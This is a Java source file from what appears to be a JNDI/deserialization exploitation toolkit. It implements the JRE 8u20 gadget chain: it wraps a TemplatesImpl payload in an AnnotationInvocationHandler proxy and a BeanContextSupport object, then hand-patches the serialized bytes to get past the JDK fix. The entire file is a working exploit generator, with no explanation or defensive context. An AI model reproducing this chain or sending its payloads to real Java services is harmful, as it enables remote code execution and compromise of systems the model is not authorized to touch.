package sonomon.jndi.deser.gadgets;

import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.beans.beancontext.BeanContextSupport;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;
import javax.xml.transform.Templates;
import sonomon.jndi.deser.Deserialize;

public class JRE8u20 implements SerializeObject{
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		return null;
	}
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
        String zeroHashCodeStr = "f5a5a608";
        HashMap<Object, Object> map = new HashMap<Object, Object>();
        Constructor<?> ctor = (Constructor<?>) Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        Permit.setAccessible(ctor);
        InvocationHandler ih = (InvocationHandler)ctor.newInstance(new Object[] { Override.class, map });
        Deserialize.setFieldValue(ih, "type", Templates.class);
        Templates TemplatesProxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[] {Templates.class}, ih);
        Deserialize.setFieldValue(tempImpl, "_auxClasses", null);
        Deserialize.setFieldValue(tempImpl, "_class", null);
        map.put(zeroHashCodeStr, tempImpl);
        LinkedHashSet<BeanContextSupport> set = new LinkedHashSet();
        BeanContextSupport bcs = new BeanContextSupport();
        Class<?> cc = Class.forName("java.beans.beancontext.BeanContextSupport");
        Field serializable = cc.getDeclaredField("serializable");
        serializable.setAccessible(true);
        serializable.set(bcs, Integer.valueOf(0));
        Field beanContextChildPeer = cc.getSuperclass().getDeclaredField("beanContextChildPeer");
        beanContextChildPeer.set(bcs, bcs);
        set.add(bcs);
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(set);
        oos.writeObject(ih);
        oos.writeObject(tempImpl);
        oos.writeObject(TemplatesProxy);
        oos.close();
        byte[] bytes = baous.toByteArray();
        bytes[89] = 3;
        int i;
        for (i = 0; i < bytes.length; i++) {
          if (bytes[i] == 0 && bytes[i + 1] == 0)
            if ((((bytes[i + 2] == 0) ? 1 : 0) & ((bytes[i + 3] == 0) ? 1 : 0)) != 0 && bytes[i + 4] == 120 && bytes[i + 5] == 120 && bytes[i + 6] == 115) {
              bytes = deleteAt(bytes, i + 5);
              break;
            }  
        } 
        for (i = 0; i < bytes.length; i++) {
          if (bytes[i] == 120 && bytes[i + 1] == 0 && bytes[i + 2] == 1 && bytes[i + 3] == 0 && bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 0 && bytes[i + 7] == 115) {
            bytes[i + 6] = 1;
            break;
          } 
        } 
        for (i = 0; i < bytes.length; i++) {
          if (bytes[i] == 119 && bytes[i + 1] == 4 && bytes[i + 2] == 0 && bytes[i + 3] == 0 && bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 120) {
            bytes = deleteAt(bytes, i);
            bytes = deleteAt(bytes, i);
            bytes = deleteAt(bytes, i);
            bytes = deleteAt(bytes, i);
            bytes = deleteAt(bytes, i);
            bytes = deleteAt(bytes, i);
            bytes = deleteAt(bytes, i);
            break;
          } 
        } 
        for (i = 0; i < bytes.length; i++) {
          if (bytes[i] == 0 && bytes[i + 1] == 0 && bytes[i + 2] == 0 && bytes[i + 3] == 0 && bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 0 && bytes[i + 7] == 0 && bytes[i + 8] == 0 && bytes[i + 9] == 0 && bytes[i + 10] == 0 && bytes[i + 11] == 120 && bytes[i + 12] == 112) {
            i += 13;
            bytes = addAtIndex(bytes, i++, (byte)119);
            bytes = addAtIndex(bytes, i++, (byte)4);
            bytes = addAtIndex(bytes, i++, (byte)0);
            bytes = addAtIndex(bytes, i++, (byte)0);
            bytes = addAtIndex(bytes, i++, (byte)0);
            bytes = addAtIndex(bytes, i++, (byte)0);
            bytes = addAtIndex(bytes, i++, (byte)120);
            break;
          } 
        } 
        for (i = 0; i < bytes.length; i++) {
          if (bytes[i] == 115 && bytes[i + 1] == 117 && bytes[i + 2] == 110 && bytes[i + 3] == 46 && bytes[i + 4] == 114 && bytes[i + 5] == 101 && bytes[i + 6] == 102 && bytes[i + 7] == 108) {
            i += 58;
            bytes[i] = 3;
            break;
          } 
        } 
        bytes = addAtLast(bytes, (byte)120);
        return bytes;
    }
	  public static byte[] deleteAt(byte[] bs, int index) {
		    int length = bs.length - 1;
		    byte[] ret = new byte[length];
		    if (index == bs.length - 1) {
		      System.arraycopy(bs, 0, ret, 0, length);
		    } else if (index < bs.length - 1) {
		      for (int i = index; i < length; i++)
		        bs[i] = bs[i + 1]; 
		      System.arraycopy(bs, 0, ret, 0, length);
		    } 
		    return ret;
		  }
		  
		  public static byte[] addAtIndex(byte[] bs, int index, byte b) {
		    int length = bs.length + 1;
		    byte[] ret = new byte[length];
		    System.arraycopy(bs, 0, ret, 0, index);
		    ret[index] = b;
		    System.arraycopy(bs, index, ret, index + 1, length - index - 1);
		    return ret;
		  }
		  
		  public static byte[] addAtLast(byte[] bs, byte b) {
		    int length = bs.length + 1;
		    byte[] ret = new byte[length];
		    System.arraycopy(bs, 0, ret, 0, length - 1);
		    ret[length - 1] = b;
		    return ret;
		  }
}